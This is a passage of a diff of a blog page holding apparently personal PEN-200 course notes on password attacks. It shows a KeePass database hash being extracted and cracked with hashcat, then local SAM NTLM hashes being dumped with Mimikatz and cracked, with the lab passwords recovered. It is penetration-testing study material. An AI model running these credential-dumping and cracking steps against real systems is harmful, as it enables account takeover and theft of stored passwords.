+&lt;p&gt;We find the DB in the user&amp;#39;s Documents folder.  Transfer the DB to our Kali system in preparation for the attack.  Thus completing the first step of our methodology.&lt;/p&gt;
+&lt;p&gt;Next, tranform the has into a format our cracking tool can use.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;JtR suite includes various transformation scripts.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py&quot;&gt;ssh2john&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c&quot;&gt;keepass2john&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;These are installed by default in Kali.&lt;/li&gt;
+&lt;li&gt;They can also format for Hashcat!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will use &lt;code&gt;keepass2john&lt;/code&gt; to format the DB and save the output as &lt;code&gt;keepass.hash&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ keepass2john Database.kdbx &amp;gt; keepass.hash
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat keepass.hash            
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Before we can work with it, we need to modify it further.&lt;/li&gt;
+&lt;li&gt;The JtR script prepended the filename &lt;code&gt;Database&lt;/code&gt; to the hash.&lt;/li&gt;
+&lt;li&gt;It does this to act as the username for the hash.&lt;/li&gt;
+&lt;li&gt;Helpful when cracking DB hashes as we want the output to contain the username:password pairs.&lt;/li&gt;
+&lt;li&gt;Since KeePass uess a master password without a username we must remove the &lt;code&gt;Database:&lt;/code&gt; string.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat keepass.hash
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The hash is now in the correct format for Hashcat!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now we must determine the correct hash type.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;To determine this hashtype.&lt;/li&gt;
+&lt;li&gt;We can look it up in the Hashcat wiki.&lt;/li&gt;
+&lt;li&gt;Or grep Hashcat help.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i &amp;quot;KeePass&amp;quot;
+  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
+  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The correct mode appears to be &lt;code&gt;13400&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will skip step 3, cracking time calculation, since this is a simple example.&lt;/p&gt;
+&lt;p&gt;Next we prepare our wordlist.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We will use a Hashcat provided rule &lt;code&gt;rockyou-30000.rule&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Combining this with the &lt;code&gt;rockyou.txt&lt;/code&gt; wordlist.&lt;/li&gt;
+&lt;li&gt;This rule is highly effect with the rockyou wordlist as it was tailored for it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We have prepared everything and are ready to begin out attack!  Run Hashcat with the requisite arguments.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+hashcat (v6.2.6) starting
+
+...
+
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
+Hash.Target......: $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d...7496c1
+Time.Started.....: Sun Oct  1 10:21:42 2023, (35 secs)
+Time.Estimated...: Sun Oct  1 10:22:17 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/rockyou-30000.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    92358 H/s (10.34ms) @ Accel:128 Loops:60 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3213312/430331550000 (0.00%)
+Rejected.........: 0/3213312 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:3137-3138 Iteration:0-60
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456123! -&amp;gt; bethany123!
+Hardware.Mon.#1..: Temp: 57c Util: 97%
+
+Started: Sun Oct  1 10:21:22 2023
+Stopped: Sun Oct  1 10:22:18 2023
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have recovered &lt;code&gt;qwertyuiop123!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run KeePass on our target system and enter the master pass when prompted.&lt;/li&gt;
+&lt;li&gt;We now have access to all of the user&amp;#39;s saved passwords.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;15.3 Working with Password Hashes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Obtain and crack NTLM hashes&lt;/li&gt;
+&lt;li&gt;Pass NTLM hashes&lt;/li&gt;
+&lt;li&gt;Obtain and crack Net-NTLMv2 hashes&lt;/li&gt;
+&lt;li&gt;Relay Net-NTLMv2 hashes&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;While in most assignments we&amp;#39;ll face an Active Directory environment, this Learning Unit only covers local Windows machines. However, the skills learned here are a stepping stone to the later Active Directory Modules in this course.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;For this, we&amp;#39;ll cover two different hash implementations on Windows: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/NT_LAN_Manager&quot;&gt;NT LAN Manager (NTLM)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3&quot;&gt;Net-NTLMv2.4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Cracking NTLM&lt;/h3&gt;
+&lt;p&gt;Windows stores hased user passwords in the &lt;a href=&quot;https://en.wikipedia.org/wiki/Security_Account_Manager&quot;&gt;Security Account Manager (SAM)&lt;/a&gt; DB file, used to auth local and remote accounts.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: LAN Manager (LM)2 and NTLM. LM is based on DES,3 and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;On modern systems, the SAM hashes are stored as NTLM.  This hash fixes many of the weaknesses of LM, i.e. passwords are case sensitive and no longer split into smaller, weaker, hashes.  However, NTLM hashes stored in the SAM DB are not salted.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Salt_(cryptography)&quot;&gt;Salts&lt;/a&gt; are random buts appended to a password &lt;em&gt;before&lt;/em&gt; it is hashed.  They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password.  A list or table of precomputed passwords is called a &lt;a href=&quot;https://en.wikipedia.org/wiki/Rainbow_table&quot;&gt;Rainbow Table&lt;/a&gt;, the attack is known as a Rainbow Table Attack.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;We use &amp;quot;NTLM hash&amp;quot; to refer to the formally correct NTHash. Since &amp;quot;NTLM hash&amp;quot; is more commonly used in our industry, we use it in this course to avoid confusion.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;We cannot perform operations on the SAM DB (copy/rename/move) in &lt;strong&gt;C:\Windows\system32\config\sam&lt;/strong&gt; while Win is running, the kernel keeps and exclusive file system lock on it.  However, this restriction can be bypassed with a &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;Mimikatz&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Mimikatz provides functions to extract plain-text passwords and password hashes, from various Win sources, and further leverage them in attack vectors like &lt;a href=&quot;https://en.wikipedia.org/wiki/Pass_the_hash&quot;&gt;pass-the-hash&lt;/a&gt;.  Mimikatz &lt;strong&gt;sekurlsa&lt;/strong&gt; module extracts hashes from the &lt;a href=&quot;https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service&quot;&gt;Local Security Authority Subsystem (LSASS)&lt;/a&gt;.  LSASS is a Win process that handles auth, password change, and &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens&quot;&gt;access tokens&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;LSASS caches NTLM hashes and other creds, which can be extracted with Mimikatz &lt;strong&gt;sekurlsa&lt;/strong&gt; module.  We need to understand that LSASS runs under the SYSTEM user, with higher privs than Administrator.  Therefore, we can only extract passwords if we are running Mimikatz as Administrator or higher, with &lt;a href=&quot;https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113&quot;&gt;SeDebugPrivilege&lt;/a&gt;.  This access right allows the debugging of processes we own and those of other users.&lt;/p&gt;
+&lt;p&gt;We can elevate our privs to SYSTEM with tools like &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/psexec&quot;&gt;PsExec&lt;/a&gt; or Mimikatz &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/wiki/module-~-token&quot;&gt;token elevation function&lt;/a&gt;.  The token elevation function requires &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege&quot;&gt;SeImpersonatePrivilege&lt;/a&gt; access right, with all local Admin accounts have by default.&lt;/p&gt;
+&lt;p&gt;Now let&amp;#39;s demonstrate how to obtain and crack NTLM hashes.  We will retrieve passwords from the SAM of the MARKETINGWK01 machine, log in via RDP with the creds provided in the lab machine below.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Start with Get-LocalUser&lt;ul&gt;
+&lt;li&gt;checking wich users exist locally on the system&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Users\offsec&amp;gt; Get-LocalUser
+
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nelly              True
+offsec             True
+sam                True
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The output indicates the existence of another user, &lt;code&gt;nelly&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;we will obtain nelly&amp;#39;s plain text password by retrieving the NTLM hash and cracking it&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We know the creds of users are stored when they log on to a Win sys&lt;ul&gt;
+&lt;li&gt;however, creds are stored in other ways&lt;ul&gt;
+&lt;li&gt;i.e. when a service is run with a user account&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We will use Mimikatz to check for stored creds on the system&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;C:\tools\mimikatz.exe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Start PowerShell as Admin&lt;ul&gt;
+&lt;li&gt;confirm the UAC popup&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;start Mimikatz&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\tools&amp;gt; .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  &amp;quot;A La Vie, A L&amp;#39;Amour&amp;quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &amp;gt; https://blog.gentilkiwi.com/mimikatz
+ &amp;#39;## v ##&amp;#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &amp;#39;#####&amp;#39;        &amp;gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now interact with Mimikatz CLI env&lt;ul&gt;
+&lt;li&gt;each command consists of a module and command delimited by two colons&lt;ul&gt;
+&lt;li&gt;i.e. &lt;code&gt;privilege::debug&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We can use various commands to extract passwords from the system&lt;ul&gt;
+&lt;li&gt;common command to attempt to extract plaintext passwords and password hashes from all source: &lt;code&gt;sekurlsa::logonpasswords&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;This generates a huge amount of output&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We can instead extract NTLM hashes from SAM with: &lt;code&gt;lsadump::sam&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;first gain SYSTEM privs with: &lt;code&gt;token::elevate&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Both commands require &lt;strong&gt;SeDebugPrivilege&lt;/strong&gt; which we attain with: &lt;code&gt;privilege::debug&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mimikatz # privilege::debug
+Privilege &amp;#39;20&amp;#39; OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+652     {0;000003e7} 1 D 41117          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -&amp;gt; Impersonated !
+ * Process Token : {0;002189f0} 2 F 3171076     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary.
+ * Thread Token  : {0;000003e7} 1 D 3533913     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : MARKETINGWK01
+SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
+Local SID : S-1-5-21-4264639230-2296035194-3358247000
+
+SAMKey : 38e2cdfccc1d5220e001dd7d9b6186b3
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: c17a032e0528525ad763c0bec3658226
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : f39c5178d64eb4811f0e24caddc71880
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 98c4bca33a76248827ddb6d7f5af7e5cc31742eab603ef34944cc4055052bb28
+      aes128_hmac       (4096) : f4f2779905636ac6d8a3dbcccd3da7ad
+      des_cbc_md5       (4096) : fe76fd5291a4b0d0
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : fe76fd5291a4b0d0
+
+
+RID  : 000003e9 (1001)
+User : offsec
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 4afc51d3706e26bc98dc90db9a50826a
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK01offsec
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 84ec02ea2dd7eb6df176b7abf418babc44e3b082a787ccebe386141eae88385e
+      aes128_hmac       (4096) : 32d058faeea4ca20356399fcf099fcbd
+      des_cbc_md5       (4096) : c8e60ecb689e1543
+    OldCredentials
+      aes256_hmac       (4096) : 8d6689fa7fb0321706ad1363167429077dcbfa1ad76e74f95ce2f58993c36eff
+      aes128_hmac       (4096) : 0bdfdee532724ecdb9f09b62dca4e2be
+      des_cbc_md5       (4096) : ab3b75862cc1c4b0
+    OlderCredentials
+      aes256_hmac       (4096) : 00df88a3ea2cc3bac58ea0ced5304301dbcdfb7c9440e3bba8fcaf07522a1902
+      aes128_hmac       (4096) : e967183d09db853175ae40e7a57d72ae
+      des_cbc_md5       (4096) : 9da4c20dad25046b
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK01offsec
+    Credentials
+      des_cbc_md5       : c8e60ecb689e1543
+    OldCredentials
+      des_cbc_md5       : ab3b75862cc1c4b0
+
+
+RID  : 000003ea (1002)
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 5036485b9af540fede9a4d43ab6fdc26
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : DESKTOP-6OLBM9Onelly
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
+      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
+      des_cbc_md5       (4096) : 7fd6f702615e0e75
+    OldCredentials
+      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
+      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
+      des_cbc_md5       (4096) : 7fd6f702615e0e75
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : DESKTOP-6OLBM9Onelly
+    Credentials
+      des_cbc_md5       : 7fd6f702615e0e75
+    OldCredentials
+      des_cbc_md5       : 7fd6f702615e0e75
+
+
+RID  : 000003ec (1004)
+User : sam
+  Hash NTLM: fa146c495c3c815edd0634d05c9af84a
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 66cddd0487d89de32b89af88a6b241f6
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK01sam
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 6e2365f44e0493fbf27a38b27e5379b1222cc2daf3b6ba19e5cdf21f58cbdfc2
+      aes128_hmac       (4096) : e4033c4aa78d497c074b51186337fb44
+      des_cbc_md5       (4096) : 155125d375579ed9
+    OldCredentials
+      aes256_hmac       (4096) : 291f17037d8e5cded6f2a9a3e3f9afe69e31cd467a2028501f5ef55f8ad45a28
+      aes128_hmac       (4096) : e9ac280a18a224ecee35956c0b1c2217
+      des_cbc_md5       (4096) : 83abf758d62ae9d5
+    OlderCredentials
+      aes256_hmac       (4096) : 291f17037d8e5cded6f2a9a3e3f9afe69e31cd467a2028501f5ef55f8ad45a28
+      aes128_hmac       (4096) : e9ac280a18a224ecee35956c0b1c2217
+      des_cbc_md5       (4096) : 83abf758d62ae9d5
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK01sam
+    Credentials
+      des_cbc_md5       : 155125d375579ed9
+    OldCredentials
+      des_cbc_md5       : 83abf758d62ae9d5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have obtained the NTLM hash for nelly&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;3ae8e5f0ffabb3a627672e1600f1ba10&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;we will copy this to &lt;code&gt;nelly.hash&lt;/code&gt; on our attacking machine&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Next we get the correct hash mode from Hashcat for OS NTLM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n &amp;quot;3ae8e5f0ffabb3a627672e1600f1ba10&amp;quot; &amp;gt; nelly.hash      
+                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat nelly.hash 
+3ae8e5f0ffabb3a627672e1600f1ba10                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i &amp;quot;ntlm&amp;quot;   
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;the correct mode is &lt;code&gt;1000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The Mimikatz output is already in a form that Hashcat accepts&lt;/li&gt;
+&lt;li&gt;Next we choose a wordlist and rule file&lt;ul&gt;
+&lt;li&gt;wordlist &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;rule &lt;code&gt;best64.rule&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;containing 64 highly effective rules&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Now we can start our attack&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat (v6.2.6) starting
+
+...
+
+3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
+Time.Started.....: Mon Oct  2 14:45:23 2023, (0 secs)
+Time.Estimated...: Mon Oct  2 14:45:23 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 37229.3 kH/s (8.02ms) @ Accel:512 Loops:77 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 315392/1104517645 (0.03%)
+Rejected.........: 0/315392 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -&amp;gt; oooooo
+Hardware.Mon.#1..: Temp: 46c Util: 14%
+
+Started: Mon Oct  2 14:45:08 2023
+Stopped: Mon Oct  2 14:45:25 2023
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;we have retrieved &lt;code&gt;nicole1&lt;/code&gt; from the NTLM hash&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;../assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;../blog/windows-priv-esc.html&quot;
+        data-default-href=&quot;../blog/windows-priv-esc.html&quot;
+        data-default-fragment=&quot;../blog/fragments/windows-priv-esc.html&quot;
+        data-fragment-href=&quot;../blog/fragments/windows-priv-esc.html&quot;
+        data-target-slug=&quot;windows-priv-esc&quot;
+        data-post-slug=&quot;windows-priv-esc&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 16 — Windows Privilege Escalation Strategies&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;../blog/av-evasion.html&quot;
+        data-default-href=&quot;../blog/av-evasion.html&quot;
+        data-default-fragment=&quot;../blog/fragments/av-evasion.html&quot;
+        data-fragment-href=&quot;../blog/fragments/av-evasion.html&quot;
+        data-target-slug=&quot;av-evasion&quot;
+        data-post-slug=&quot;av-evasion&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 14 — Antivirus Evasion in 2023&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+  &lt;footer&gt;
+    
+      &lt;!-- footer partial (auto-generated) --&gt;
+&lt;div id=&quot;foot&quot;&gt;
+  &lt;p&gt;
+    &lt;center&gt;
+      Warning! Chaosandmajesty.com accepts no responsibility for your interactions with WOPR.
+    &lt;/center&gt;
+  &lt;/p&gt;
+&lt;/div&gt;
+
+    
+    &lt;div class=&quot;container footer-container&quot;&gt;
+      &lt;p class=&quot;footer-copy&quot;&gt;&amp;copy; 2025 Core&lt;/p&gt;
+    &lt;/div&gt;
+  &lt;/footer&gt;
+
+  &lt;button type=&quot;button&quot; class=&quot;blog-back-to-top&quot; aria-label=&quot;Back to top&quot;&gt;
+    ▲
+  &lt;/button&gt;
+
+  &lt;script&gt;
+    document.addEventListener(&#039;DOMContentLoaded&#039;, function() {
+      var toggleBtn = document.querySelector(&#039;.nav-toggle&#039;);
+      var headerEl = document.querySelector(&#039;header&#039;);
+      if (toggleBtn) {
+        toggleBtn.addEventListener(&#039;click&#039;, function() {
